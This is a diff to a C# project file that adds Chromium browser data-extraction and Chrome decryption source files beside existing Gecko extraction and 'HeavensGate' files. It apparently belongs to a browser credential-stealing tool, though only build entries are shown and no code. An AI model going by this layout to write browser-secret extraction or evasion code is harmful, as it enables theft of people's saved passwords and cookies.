@@ -55,6 +55,7 @@
   <ItemGroup>
     <Reference Include="System" />
     <Reference Include="System.Core" />
+    <Reference Include="System.Security" />
     <Reference Include="System.Web.Extensions" />
     <Reference Include="System.Xml.Linq" />
     <Reference Include="System.Data.DataSetExtensions" />
@@ -65,7 +66,9 @@
   </ItemGroup>
   <ItemGroup>
     <Compile Include="AesGcm\AesGcm.cs" />
+    <Compile Include="DataExtraction\Browsers\Chromium.cs" />
     <Compile Include="DataExtraction\Browsers\Gecko.cs" />
+    <Compile Include="DataExtraction\Decryption\ChromeDecryptor.cs" />
     <Compile Include="DataExtraction\Decryption\GeckoDecryptor.cs" />
     <Compile Include="HeavensGate\Heavensgate.cs" />
     <Compile Include="InternalStructs\BCryptInternalStructs.cs" />
